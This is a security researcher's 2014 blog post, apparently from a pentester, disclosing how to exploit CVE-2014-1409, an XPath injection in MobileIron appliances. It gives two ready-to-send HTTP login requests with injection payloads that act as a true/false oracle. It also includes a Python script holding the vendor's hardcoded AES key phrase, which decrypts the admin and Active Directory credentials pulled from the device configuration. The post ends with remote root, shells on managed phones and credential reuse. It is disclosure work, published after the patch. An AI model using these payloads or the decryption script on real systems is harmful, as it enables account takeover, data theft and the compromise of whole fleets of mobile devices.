<!DOCTYPE html>
<html lang="en">
<head>
	<link rel="stylesheet" type="text/css" href="/theme/css/style.css">
	<!--<link rel="stylesheet/less" type="text/css" href="/theme/css/style.less">-->
	<!--<script src="/theme/js/less.js" type="text/javascript"></script>-->
	<link rel="stylesheet" type="text/css" href="/theme/css/pygments.css">
	<link href='//fonts.googleapis.com/css?family=Open%2bSans%3a800,400,300%7CInconsolata' rel='stylesheet' type='text/css' />

	<link href="//florent.daigniere.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="NextGen$'s blog ATOM Feed" />
	<link href="//florent.daigniere.com/feeds/all.rss.xml" type="application/rss+xml" rel="alternate" title="NextGen$'s blog RSS Feed" />


		<title>NextGen$'s blog</title>
		<meta charset="utf-8" />
</head>
<body>
	<section id="sidebar">
		<figure id="user_logo">
            <a href="//florent.daigniere.com"><div class="logo">&nbsp;</div></a>
		</figure>

		<div class="user_meta">
            <h1 id="user"><a href="//florent.daigniere.com" class="">Florent Daigni&egrave;re</a></h1>
			<h2></h2>
			<p class="bio">The blog of an opinionated French guy, Technical Director (<a content="nofollow" href="https://www.trustmatta.com/">@Matta</a>), BOFH and core developer (<a content="nofollow" href="https://freenetproject.org">@Freenet</a>), traveller, hacker.</p>
			<ul>
					<li><a href="https://twitter.com/nextgens1">Twitter</a></li>
					<li><a href="https://uk.linkedin.com/in/nextgens">Linkedin</a></li>
					<li><a href="https://github.com/nextgens/">Github</a></li>
			</ul>
		</div>
		<footer>
			<address>
				Powered by <a content="nofollow" href="http://pelican.notmyidea.org/">Pelican</a>,
		                theme by <a content="nofollow" href="https://github.com/wting/pelican-svbtle">wting</a>.

			</address>
				<a href="//florent.daigniere.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="NextGen$'s blog ATOM Feed"><img src="/images/rss.svg" alt="Subscribe to NextGen$'s blog" height="15" />ATOM</a>
			<a href="//florent.daigniere.com/feeds/all.rss.xml" type="application/rss+xml" rel="alternate" title="NextGen$'s blog RSS Feed"><img src="/images/rss.svg" alt="Subscribe to NextGen$'s blog" height="15" />RSS</a>
		</footer>
	</section>

	<section id="posts">
	<header>
		<h1>Florent Daigni√®re's blog</h1>
		<h3>Posted 23 Jun, 2014</h3>
	</header>
	<article>
		<h1 id="title">
			<a href="/posts/2014/06/cve-2014-1409-or-the-sad-tale-of-an-xpath-injection-affecting-mobileiron-products/" rel="bookmark"
				title="Permalink to CVE-2014-1409 or the sad tale of an XPath injection affecting mobileiron products">CVE-2014-1409 or the sad tale of an XPath injection affecting mobileiron products</a>
		</h1>
		<p>Following up on my last post about <a class="reference external" href="https://www.owasp.org/index.php/XPATH_Injection">XPath</a> injections, I will document part of the process we went through to exploit <a class="reference external" href="https://www.trustmatta.com/advisories/MATTA-2013-004.txt">CVE-2014-1409</a> and hopefully convince a few that this category of bugs is no joke and should be looked for during pentests.</p>
<p>So, what about it? Well, let me tell you a story. The story of a remote-root which doesn't involve any memory corruption on a very widely used and deployed appliance sold by a security vendor.</p>
<p>In terms of exploitation methodology, here is what needs doing:</p>
<blockquote>
<ol class="arabic simple">
<li>identify a valid/error pattern (see requests below)</li>
<li>turn the valid/error pattern into a true/false one (trivial)</li>
<li>exfiltrate the XML content (see structure of the document below to build an optimized query)</li>
<li>de-obfuscate the credentials (see below).</li>
<li>login</li>
</ol>
</blockquote>
<p>All of the above has been described in <a class="reference external" href="https://www.trustmatta.com/advisories/MATTA-2013-004.txt">MATTA-2013-004</a>; The vendor has issued a patch and it was made public on 02-04-14. I feel like releasing more details will help other members of the security community develop signatures for IDSes and plugins for vulnerability scanners.</p>
<p>The two HTTP requests I use to check whether an appliance is vulnerable are the following:</p>
<div class="highlight"><pre><span></span><span class="n">POST</span> <span class="o">/</span><span class="n">mics</span><span class="o">/</span><span class="n">j_spring_security_check</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="n">Host</span><span class="p">:</span> <span class="n">XXX</span>
<span class="n">Referer</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">XXX</span><span class="o">/</span><span class="n">mics</span><span class="o">/</span><span class="n">login</span><span class="o">.</span><span class="n">jsp</span>
<span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">48</span>

<span class="n">j_username</span><span class="o">=</span><span class="n">x</span><span class="s1">&#39;and+concat(&#39;</span><span class="mi">1</span><span class="s1">&#39;,&#39;</span><span class="mi">1</span><span class="s1">&#39;)=&#39;</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">j_password</span><span class="o">=</span><span class="n">p</span>
</pre></div>
<p>-&gt; 'valid' case: response will be HTTP 302</p>
<div class="highlight"><pre><span></span><span class="n">POST</span> <span class="o">/</span><span class="n">mics</span><span class="o">/</span><span class="n">j_spring_security_check</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="n">Host</span><span class="p">:</span> <span class="n">XXX</span>
<span class="n">Referer</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">XXX</span><span class="o">/</span><span class="n">mics</span><span class="o">/</span><span class="n">login</span><span class="o">.</span><span class="n">jsp</span>
<span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">48</span>

<span class="n">j_username</span><span class="o">=</span><span class="n">x</span><span class="s1">&#39;and+concat(&#39;</span><span class="mi">1</span><span class="s1">&#39;,&#39;</span><span class="mi">1</span><span class="s1">&#39;=)&#39;</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">j_password</span><span class="o">=</span><span class="n">p</span>
</pre></div>
<p>-&gt; 'error' case: response will be HTTP 404</p>
<p>With the assistance of <a class="reference external" href="https//github.com/orf/xcat/">XCat</a> and the following <a class="reference external" href="../exploiting-xpath-injection-vulnerabilities-with-xcat/index.html">patches</a>, you should be able to download the device's configuration file. It contains the obfuscated credentials you will need to connect to <a class="reference external" href="https://XXX/mics/login.jsp">https://XXX/mics/login.jsp</a> as administrator! Keep in mind that you need to set the Referer header for the test vector to work; I have a separate <a class="reference external" href="https//github.com/orf/xcat/">XCat</a> patch for that too.</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;configuration&gt;&lt;identity&gt;</span>
<span class="nt">&lt;user&gt;</span>
        <span class="nt">&lt;principal&gt;</span>admin<span class="nt">&lt;/principal&gt;</span>
        <span class="nt">&lt;password&gt;</span>base64 encoded obfuscated password<span class="nt">&lt;/password&gt;</span>
<span class="nt">&lt;/user&gt;</span>

<span class="nt">&lt;/identity&gt;&lt;/configuration&gt;</span>
</pre></div>
<p>If the applicance is linked to active-directory (or another LDAP server), it will contain the credentials to connect to it (&lt;directoryUserID&gt; and &lt;directoryPassword&gt;).</p>
<p>The credentials are obfuscated using encryption and a static key. The following script should get you the plaintext:</p>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
<span class="c1">#</span>
<span class="c1">#  MobileIron uses AES-ECB-PKCS1.5 (with a known key)</span>
<span class="c1"># to store credentials... What a brilliant idea!</span>
<span class="c1">#</span>
<span class="c1"># This script is about checking whether the provided</span>
<span class="c1"># hash is vulnerable to CVE-2013-7286 or not.</span>
<span class="c1">#</span>
<span class="c1"># NextGen$ ~ 2013</span>

<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">:</span>
 <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="s1">&#39;Usage: ./CVE-2013-7286.py &lt;base64encoded blob&gt;&#39;</span><span class="p">)</span>

<span class="n">BS</span> <span class="o">=</span> <span class="mi">8</span>
<span class="n">unpad</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="o">-</span><span class="nb">ord</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])]</span>

<span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="c1"># Generate the master key...</span>
    <span class="c1"># Yes. It&#39;s not a typo!</span>
    <span class="n">phrase</span> <span class="o">=</span> <span class="s1">&#39;Hakuna matata what a woderful phrase&#39;</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">()</span>
    <span class="n">m</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">phrase</span><span class="p">)</span>
    <span class="c1"># We only want the 16 first bytes (128bit key, 160bit hash function)</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">digest</span><span class="p">()[:</span><span class="mi">16</span><span class="p">]</span>
    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">a2b_base64</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">))</span>
    <span class="n">vulnerable</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="ow">and</span> <span class="nb">all</span><span class="p">(</span><span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">plaintext</span><span class="p">)</span>
    <span class="k">print</span> <span class="s1">&#39;</span><span class="si">%s</span><span class="s1">VULNERABLE TO CVE-2013-7286&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="s1">&#39;&#39;</span> <span class="k">if</span> <span class="n">vulnerable</span> <span class="k">else</span> <span class="s1">&#39;NOT &#39;</span><span class="p">)</span>
</pre></div>
<p>Once logged in as administrator on the device, it's game over. You can remotely deploy apps (and get shells!) on all the attached mobile devices and you can capture the traffic flowing through the device. Moreover, you might be able to reuse the AD credentials elsewhere on the infrastructure... OWA and SSL-VPNs are obvious targets. Overall it's a very difficult compromize to recover from as the defender; a successfull attack leaves no useful log to speak of.</p>


		<div id="article_meta">
				Category:
					<a href="/category/blog.html">Blog</a>
				<br />Tags:
					<a href="/tag/exploitation.html">exploitation</a>
					<a href="/tag/security.html">security</a>
					<a href="/tag/blog.html">blog</a>
		</div>
	</article>

	<footer>
		<a href="/" class="button_accent">&larr;&nbsp;&nbsp;&nbsp;Back to blog</a>
	</footer>

	<div id="comments">
		<h2>Comments</h2>
		<div id="disqus_thread"></div>
		<script type="text/javascript">
			var disqus_identifier = "posts/2014/06/cve-2014-1409-or-the-sad-tale-of-an-xpath-injection-affecting-mobileiron-products/";
			(function() {
				var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
				dsq.src = 'http://nextgens.disqus.com/embed.js';
				(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
			})();
		</script>
		<noscript>Please enable JavaScript to view <a href="http://disqus.com/?ref_noscript">comments</a>.</noscript>
	</div>

	</section>

<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', "UA-21805753-2", 'auto');
ga('require', 'linkid', 'linkid.js');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->
</body>
</html>